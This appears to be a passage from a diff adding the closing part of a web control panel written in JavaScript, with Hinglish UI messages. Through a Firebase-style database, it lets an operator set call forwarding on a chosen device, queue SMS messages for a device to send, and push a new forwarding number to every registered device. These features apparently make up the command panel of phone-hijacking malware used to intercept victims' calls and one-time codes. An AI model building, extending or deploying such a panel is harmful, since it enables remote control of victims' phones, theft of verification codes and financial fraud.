+  var path = NODE + '/All_User/' + CUR + '/Call_For';
+  if (action === 'check') {
+    fbGet(path).then(function(d) {
+      var r = document.getElementById('cf-res'); r.style.display = 'block';
+      if (d && !d.error) {
+        r.textContent = 'Forward To: ' + (d.ForwardTo||'-') + ' | Status: ' + (d.Status||'-');
+      } else { r.textContent = 'Call forwarding set nahi hai'; }
+    });
+    return;
+  }
+  fbSet(path, {ForwardTo:num, Status:action, Sim:SEL_SIM+1, updatedAt:Date.now()}).then(function() {
+    showToast(action==='active' ? '&#9989; Call Forwarding Active!' : '&#9989; Deactivated!');
+    closeDialog('dlg-cf');
+  }).catch(function(e) { showToast('Error: ' + e.message); });
+}
+
+/* ======== SMS SEND ======== */
+function openSmsSend() {
+  document.getElementById('sms-to').value = '';
+  document.getElementById('sms-msg').value = '';
+  openDialog('dlg-sms');
+}
+function doSendSms() {
+  var to = document.getElementById('sms-to').value.trim();
+  var msg = document.getElementById('sms-msg').value.trim();
+  if (!to || !msg) { showToast('Number aur message dono daalo!'); return; }
+  fbSet(NODE + '/All_User/' + CUR + '/SendSms', {
+    to: to, message: msg, status: 'pending', timestamp: Date.now()
+  }).then(function() {
+    showToast('&#9989; SMS Send Done!'); closeDialog('dlg-sms');
+  }).catch(function(e) { showToast('Error: '+e.message); });
+}
+
+/* ======== UPDATE NO ======== */
+function openUpdNo() { document.getElementById('upd-num').value = ''; openDialog('dlg-upd'); }
+function doUpdateNo() {
+  var num = document.getElementById('upd-num').value.trim();
+  if (!num) { showToast('Number daalo!'); return; }
+  var dkeys = Object.keys(DEVS);
+  if (!dkeys.length) { showToast('Koi device nahi!'); return; }
+  var done = 0;
+  for (var i = 0; i < dkeys.length; i++) {
+    (function(k) {
+      fbSet(NODE + '/All_User/' + k + '/UpdateNo', num).then(function() {
+        done++;
+        if (done === dkeys.length) { showToast('&#9989; ' + done + ' devices updated!'); closeDialog('dlg-upd'); }
+      });
+    })(dkeys[i]);
+  }
+}
+
+/* ======== UTILS ======== */
+function getTs(s) {
+  var t = s.timestamp || s.date || s.Date || s.time || 0;
+  if (typeof t === 'number') return t > 1e12 ? t : t * 1000;
+  try { return new Date(t).getTime() || 0; } catch(e) { return 0; }
+}
+function fmtDate(t) {
+  if (!t) return '';
+  try {
+    var d = typeof t === 'number' ? (t > 1e12 ? new Date(t) : new Date(t*1000)) : new Date(t);
+    if (isNaN(d.getTime())) return String(t);
+    return d.toLocaleString('en-IN', {day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  } catch(e) { return String(t); }
+}
+function eh(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function ea(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+function openDialog(id) { document.getElementById(id).style.display = 'flex'; }
+function closeDialog(id) { document.getElementById(id).style.display = 'none'; }
+
+/* Close overlay on outside tap */
+var ovls = document.querySelectorAll('.overlay');
+for (var oi = 0; oi < ovls.length; oi++) {
+  ovls[oi].addEventListener('click', function(e) { if (e.target === this) this.style.display = 'none'; });
+}
+
+function showToast(msg) {
+  var t = document.getElementById('toast'); t.innerHTML = msg; t.style.opacity = '1';
+  clearTimeout(TTIMER); TTIMER = setTimeout(function() { t.style.opacity = '0'; }, 2500);
+}
+</script>
+</body>
+</html>
